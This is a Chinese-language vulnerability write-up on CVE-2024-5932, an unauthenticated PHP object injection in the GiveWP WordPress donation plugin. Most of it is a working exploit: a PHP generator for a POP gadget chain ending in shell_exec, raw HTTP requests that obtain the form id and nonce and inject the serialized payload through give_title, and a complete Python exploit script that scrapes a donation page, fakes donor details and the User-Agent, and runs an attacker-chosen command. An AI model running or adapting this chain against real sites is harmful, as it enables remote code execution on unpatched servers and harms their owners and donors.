# WordPress插件GiveWP存在反序列漏洞(CVE-2024-5932)

WordPress中的GiveWP捐款插件和募捐平台插件存在PHP对象注入漏洞，该漏洞存在于所有版本，包括最高版本3.14.1在内。漏洞源于对来自“give_title”参数的不可信输入进行反序列化操作。这使得未经身份验证的攻击者能够注入PHP对象。此外，如果存在POP链，攻击者可以远程执行代码并删除任意文件。

## poc

### 生成pop链 poc.php

```php
<?php
namespace Stripe{
	class StripeObject
	{
		protected $_values;
		public function __construct(){
			$this->_values['foo'] = new \Give\PaymentGateways\DataTransferObjects\GiveInsertPaymentData();
		}
	}
}

namespace Give\PaymentGateways\DataTransferObjects{
	class GiveInsertPaymentData{
    public $userInfo;
		public function __construct()
    {
        $this->userInfo['address'] = new \Give();
    } 
	}
}	

namespace{
	class Give{
		protected $container;
		public function __construct()
		{
			$this->container = new \Give\Vendors\Faker\ValidGenerator();
		}
	}
}

namespace Give\Vendors\Faker{
	class ValidGenerator{
		protected $validator;
		protected $generator;
		public function __construct()
		{
			$this->validator = "shell_exec";
			$this->generator = new \Give\Onboarding\SettingsRepository();
		}
	}
}

namespace Give\Onboarding{
	class SettingsRepository{
		protected $settings;
		public function __construct()
		{
			$this -> settings['address1'] = 'touch /tmp/EQSTtest';
		}
	}
}

namespace{
	$a = new Stripe\StripeObject();
	echo serialize($a);
}
```

### 漏洞复现

**获取give_form_id**

```php
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 192.168.178.100:9000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 23
Connection: keep-alive
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="101", "Chromium";v="101", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0

action=give_form_search
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409050947910.png)

**获取 give-form-hash**

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 192.168.178.100:9000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 47
Connection: keep-alive
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="101", "Chromium";v="101", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0

action=give_donation_form_nonce&give_form_id=11
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409050948442.png)



**give_title 填入poc.php生成的序列化数据**

```php
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 192.168.178.100:9000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 653
Connection: keep-alive
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="101", "Chromium";v="101", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0

action=give_process_donation&give-form-hash=cc27fec673&give-form-id=11&give_email=1@random.com&give_first=a&give-amount=10&give-gateway=manual&give_stripe_payment_method=&give_last=b&give_title=to_be_unserialized
```



### 利用脚本

```python
import requests
from bs4 import BeautifulSoup
from faker import Faker
from urllib.parse import urlparse
import random
import hashlib
import time
import sys
import re
import rich_click as click

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

banner = r""" 
Analysis base : https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin/

=============================================================================================================    

CVE-2024-5932 : GiveWP unauthenticated PHP Object Injection
description: The GiveWP  Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.14.1 via deserialization of untrusted input from the 'give_title' parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to execute code remotely, and to delete arbitrary files.
Arbitrary File Deletion

============================================================================================================= 
    """

class GiveWPExploit:

    def __init__(self, url: str, file: str):
        self.url = url
        self.file = file

    def greeting() -> None:
        print(banner)

    def spinner(duration=10, interval=0.1) -> None:
        spinner_chars = ['|', '/', '-', '\\']
        end_time = time.time() + duration
        while time.time() < end_time:
            for char in spinner_chars:
                sys.stdout.write(f'\r[{char}] Exploit loading, please wait...')
                sys.stdout.flush()
                time.sleep(interval)
        print("")

    def getBaseUrl(self, url):
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        return base_url

    def getParams(self) -> dict:
        response = requests.get(self.url)
        soup = BeautifulSoup(response.text, 'html.parser')

        give_form_id = soup.find('input', {'name': 'give-form-id'})['value']
        give_form_hash = soup.find('input', {'name': 'give-form-hash'})['value']
        button_tag = soup.find('button', {'data-price-id': True})
        give_price_id = button_tag['data-price-id']
        give_amount = button_tag.get_text(strip=True)

        # Fake Userinfo
        fake = Faker()
        
        params = {"give-form-id" : give_form_id, 
                  "give-form-hash" : give_form_hash, 
                  "give-price-id" : give_price_id,
                  "give-amount" : give_amount,
                  "give_first": fake.first_name(),
                  "give_last": fake.last_name(),
                  "give_email": fake.email(),}
        
        return params

    def getData(self) -> dict:
        file = self.file
        rand_md5 = hashlib.md5(str(random.randint(0, 10)).encode()).hexdigest()
        # Payload
        payload = 'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:%d:"%s";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}' % (len(file), file)
        data = self.getParams()
        data['give_title'] = payload
        data['give-gateway'] = 'offline'
        data['action'] = 'give_process_donation'
        print(f"[+] Requested Data: ")
        print(data)
        return data

    def isEmbed(self, url: str) -> str:
        pattern = r'<iframe[\s\S]*?\bname="give-embed-form"[\s\S]*?>'
        response = requests.get(url)
        match = re.search(pattern, response.text)
        if match:
            soup1 = BeautifulSoup(response.text, 'html.parser')
            embed_url = soup1.find('iframe')['src']
            return embed_url
        else:
            return url
        
    def sendRequest(self) -> None:
        # Fake User_Agent
        fake = Faker()
        baseUrl = self.getBaseUrl(self.url)
        reqUrl = f"{baseUrl}/wp-admin/admin-ajax.php"
        data = self.getData()
        headers = {
            'User-Agent': fake.user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate, br'
        }
        response = requests.post(reqUrl, data=data, headers=headers)

    def exploit(self) -> None:
        self.url = self.isEmbed(self.url)
        self.sendRequest()

# argument parsing with rich_click
@click.command()
@click.option(
    "-u",
    "--url",
    required=True,
    help="Specify a URL or domain for vulnerability detection (Donation-Form Page)",
)
@click.option(
    "-c",
    "--cmd",
    default="/tmp/test",
    help="Specify the file to read from the server",
)

def main(url: str, cmd: str) -> None:
    cve_exploit = GiveWPExploit(url, cmd)
    GiveWPExploit.greeting()
    GiveWPExploit.spinner(duration=1)
    cve_exploit.exploit()

if __name__ == "__main__":
    main()
```



## 漏洞来源

- https://github.com/EQSTLab/CVE-2024-5932
- https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/